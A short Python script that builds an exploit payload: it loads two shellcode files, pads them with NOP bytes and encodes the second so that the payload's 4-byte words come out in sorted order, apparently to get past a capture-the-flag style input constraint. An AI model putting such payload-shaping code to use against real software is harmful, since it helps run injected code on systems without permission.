import sys
import os.path
import struct

buf = open(os.path.join(os.path.dirname(__file__), 'shellcode')).read()
buf2 = open(os.path.join(os.path.dirname(__file__), 'shellcode2')).read()
while len(buf) % 4:
    buf += '\x90'
#chunks = [buf[x:x+4] for x in range(0, len(buf), 4)]
#for i in range(len(chunks)):
#    print hex(struct.unpack('<I', chunks[i])[0])
while len(buf2) % 3:
    buf2 += '\x90'
chunks = [buf2[x:x+3] for x in range(0, len(buf2), 3)]
for i in range(len(chunks)):
    tmp = struct.unpack('<I', chunks[i]+'\x00')[0]
    chunks[i] = struct.pack('<I', tmp + ((i+0xc0) << 24))
buf += ''.join(chunks)
chunks = [struct.unpack('<I', buf[x:x+4])[0] for x in range(0, len(buf), 4)]
if sorted(chunks) != chunks:
    sys.stderr.write('Chunks are not sorted!' + '\n')
    for x in chunks:
        sys.stderr.write(hex(x) + '\n')
    sys.exit(1)

print(len(buf))
sys.stdout.write(buf)
